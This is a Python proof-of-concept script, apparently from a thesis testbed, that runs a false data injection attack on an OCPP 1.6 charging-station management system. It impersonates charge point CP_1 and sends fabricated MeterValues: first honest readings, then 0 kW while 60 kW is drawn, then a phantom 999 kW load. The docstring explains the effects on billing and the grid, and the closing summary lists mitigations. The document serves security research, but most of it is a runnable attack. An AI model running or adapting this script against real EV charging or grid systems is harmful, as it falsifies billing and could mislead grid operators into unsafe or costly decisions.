"""
===========================================================================
EVSecSim PoC — Attack #3: MeterValues False Data Injection (OCPP 1.6)
===========================================================================

WHAT THIS ATTACK DOES (plain English)
--------------------------------------
A charging station reports its power usage to the CSMS every few seconds
using MeterValues messages. In OCPP 1.6 these messages are:
  - Not signed
  - Not verified
  - Trusted unconditionally by the CSMS

This means a compromised charging station can send ANY power value it
wants. The CSMS logs it, the operator dashboard shows it, and billing
is calculated from it — all based on a lie.

This script pretends to be a normal charging station (CP_1), connects
to the real CSMS, and runs through three phases automatically:

  PHASE 1 — NORMAL (0 to 15s)
    Sends real power values: alternates between 0 and 60 kW
    CSMS sees the truth. This is the baseline.

  PHASE 2 — UNDER-REPORT (15s to 30s)
    Actually drawing ~60 kW but reporting 0 kW to the CSMS.
    Effect: operator thinks the charger is idle. 
    Grid load is invisible. Billing is zeroed.

  PHASE 3 — OVER-REPORT (30s to 45s)
    Actually drawing 0 kW but reporting 999 kW to the CSMS.
    Effect: operator thinks there is a massive load event.
    Could trigger false demand-response actions, false alerts,
    or corrupt grid management decisions.

WHY THIS MATTERS FOR THE GRID
-------------------------------
In Singapore's SP Group architecture, the CSMS aggregates MeterValues
from all charging stations and reports total load to the grid operator.
If an attacker compromises a fleet of stations:

  - Under-reporting: grid operator cannot see real load → 
    undersupply risk, voltage instability

  - Over-reporting: grid operator sees phantom load →
    unnecessary generation dispatch, demand response triggered,
    financial cost to network

HOW TO RUN
----------
  Terminal 1 (CSMS):
    python csms_server4.py

  Terminal 2 (this attack — acts as the compromised EVSE):
    python attack_fdi.py

  Watch both terminals side by side.
  The CSMS should show the fake values, not the real ones.

  Optional pcap:
    tcpdump -i lo -w fdi_attack.pcap port 9000

WHAT TO LOOK FOR
----------------
  Attack terminal → shows REAL value being "sent" (what the charger knows)
  CSMS terminal   → shows FAKE value being "received" (what the operator sees)
  The gap between these two = the attack working.

===========================================================================
"""

import asyncio
import os
import websockets
from datetime import datetime, timezone

from ocpp.v16 import ChargePoint as cp, call
from ocpp.v16.enums import RegistrationStatus

# ===========================================================================
# CONFIG — change these to suit your testbed
# ===========================================================================

CSMS_URL         = os.environ.get("CSMS_URL", "ws://127.0.0.1:9000")
CP_ID            = "CP_1"          # pretend to be this charge point
CONNECTOR_ID     = 1

PHASE1_DURATION  = 15              # seconds of honest reporting
PHASE2_DURATION  = 15              # seconds of under-reporting (hide load)
PHASE3_DURATION  = 15              # seconds of over-reporting (fake load)

REAL_POWER_KW    = 60.0            # what the charger is actually drawing
IDLE_POWER_KW    = 0.0             # charger genuinely idle
FAKE_LOW_KW      = 0.0             # lie: report idle while drawing 60 kW
FAKE_HIGH_KW     = 999.0           # lie: report massive load while idle

SEND_INTERVAL_S  = 2               # how often to send MeterValues

# ===========================================================================
# COLOUR OUTPUT
# ===========================================================================

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log_normal(real, reported):
    match = "✓" if abs(real - reported) < 0.1 else "✗"
    print(f"[{ts()}] {GREEN}NORMAL  {RESET}| real={real:6.1f} kW | reported={reported:6.1f} kW | {match}")

def log_under(real, reported):
    print(f"[{ts()}] {YELLOW}UNDER   {RESET}| real={real:6.1f} kW | reported={reported:6.1f} kW | "
          f"{RED}HIDING {real - reported:.0f} kW from operator{RESET}")

def log_over(real, reported):
    print(f"[{ts()}] {RED}OVER    {RESET}| real={real:6.1f} kW | reported={reported:6.1f} kW | "
          f"{RED}FAKING {reported - real:.0f} kW phantom load{RESET}")

# ===========================================================================
# COMPROMISED CHARGE POINT
# ===========================================================================

class CompromisedEVSE(cp):
    """
    A charge point that has been compromised by an attacker.
    It connects and boots normally — the CSMS cannot tell the difference.
    But its MeterValues reports are fabricated.
    """

    async def register(self):
        """Boot normally — CSMS accepts without any credential check."""
        response = await self.call(call.BootNotification(
            charge_point_vendor="Compromised-Vendor",
            charge_point_model="FDI-Demo-v1",
        ))
        print(f"[{ts()}] Registered with CSMS — status: {response.status}")
        return response.status == RegistrationStatus.accepted

    async def send_meter(self, power_kw: float):
        """Send a single MeterValues report with the given power value."""
        await self.call(call.MeterValues(
            connector_id=CONNECTOR_ID,
            meter_value=[{
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "sampledValue": [{
                    "value": str(round(power_kw, 2)),
                    "measurand": "Power.Active.Import",
                    "unit": "kW",
                }]
            }]
        ))

    async def run_attack(self):
        """
        Run all three phases in sequence.
        Each phase sends MeterValues at SEND_INTERVAL_S and prints a
        side-by-side comparison of real vs reported power.
        """

        if not await self.register():
            print("Registration failed — is csms_server4.py running?")
            return

        print()
        print(f"{BOLD}{'='*60}{RESET}")
        print(f"{BOLD}  MeterValues FDI Attack — CP: {CP_ID}{RESET}")
        print(f"{'='*60}")
        print(f"  Format: real power (what charger draws)")
        print(f"          reported power (what CSMS sees)")
        print(f"{'='*60}")
        print()

        # ------------------------------------------------------------------
        # PHASE 1 — Normal honest reporting
        # ------------------------------------------------------------------
        print(f"{GREEN}{BOLD}PHASE 1 — NORMAL REPORTING ({PHASE1_DURATION}s){RESET}")
        print(f"Sending real values. CSMS should match this terminal.")
        print()

        elapsed = 0
        toggle  = True
        while elapsed < PHASE1_DURATION:
            real     = REAL_POWER_KW if toggle else IDLE_POWER_KW
            reported = real          # honest — no manipulation
            log_normal(real, reported)
            await self.send_meter(reported)
            await asyncio.sleep(SEND_INTERVAL_S)
            elapsed += SEND_INTERVAL_S
            toggle   = not toggle

        print()

        # ------------------------------------------------------------------
        # PHASE 2 — Under-report: hide real load from operator
        # ------------------------------------------------------------------
        print(f"{YELLOW}{BOLD}PHASE 2 — UNDER-REPORTING ({PHASE2_DURATION}s){RESET}")
        print(f"Charger draws {REAL_POWER_KW} kW. Reporting {FAKE_LOW_KW} kW to CSMS.")
        print(f"Operator sees idle charger. Real grid load is hidden.")
        print()

        elapsed = 0
        while elapsed < PHASE2_DURATION:
            real     = REAL_POWER_KW   # charger is actually drawing power
            reported = FAKE_LOW_KW     # but we tell the CSMS it is idle
            log_under(real, reported)
            await self.send_meter(reported)
            await asyncio.sleep(SEND_INTERVAL_S)
            elapsed += SEND_INTERVAL_S

        print()

        # ------------------------------------------------------------------
        # PHASE 3 — Over-report: inject phantom load
        # ------------------------------------------------------------------
        print(f"{RED}{BOLD}PHASE 3 — OVER-REPORTING ({PHASE3_DURATION}s){RESET}")
        print(f"Charger is idle. Reporting {FAKE_HIGH_KW} kW to CSMS.")
        print(f"Operator sees massive load spike. Phantom demand event.")
        print()

        elapsed = 0
        while elapsed < PHASE3_DURATION:
            real     = IDLE_POWER_KW   # charger is idle
            reported = FAKE_HIGH_KW    # but we lie and say it is maxed out
            log_over(real, reported)
            await self.send_meter(reported)
            await asyncio.sleep(SEND_INTERVAL_S)
            elapsed += SEND_INTERVAL_S

        print()
        self._print_summary()

    def _print_summary(self):
        print(f"{BOLD}{'='*60}{RESET}")
        print(f"{BOLD}  Attack complete — thesis evidence checklist{RESET}")
        print(f"{'='*60}")
        print(f"  {GREEN}[Phase 1]{RESET} CSMS values match attack terminal → baseline OK")
        print(f"  {YELLOW}[Phase 2]{RESET} CSMS shows 0 kW while attack shows 60 kW → FDI confirmed")
        print(f"  {RED}[Phase 3]{RESET} CSMS shows 999 kW while attack shows 0 kW → phantom load confirmed")
        print()
        print(f"  Wireshark filter : websocket && ip.dst == 127.0.0.1")
        print(f"  Look for         : MeterValues frames with value=0.0 and 999.0")
        print(f"  Key finding      : CSMS accepts all values with no validation")
        print()
        print(f"  Mitigation:")
        print(f"    OCPP 2.0.1 — signed MeterValues + mutual TLS auth")
        print(f"    Plausibility check on CSMS side (flag values > rated capacity)")
        print(f"    Cross-reference with smart meter / substation SCADA data")
        print(f"{'='*60}")

# ===========================================================================
# MAIN
# ===========================================================================

async def main():
    print(f"Connecting to CSMS at {CSMS_URL} as '{CP_ID}' ...")

    try:
        async with websockets.connect(CSMS_URL, ping_interval=None) as ws:
            await ws.send(CP_ID)

            evse = CompromisedEVSE(CP_ID, ws)
            asyncio.create_task(evse.start())

            await asyncio.sleep(0.1)   # let start() begin reading

            await evse.run_attack()

    except ConnectionRefusedError:
        print(f"Cannot connect to {CSMS_URL} — is csms_server4.py running?")

if __name__ == "__main__":
    asyncio.run(main())
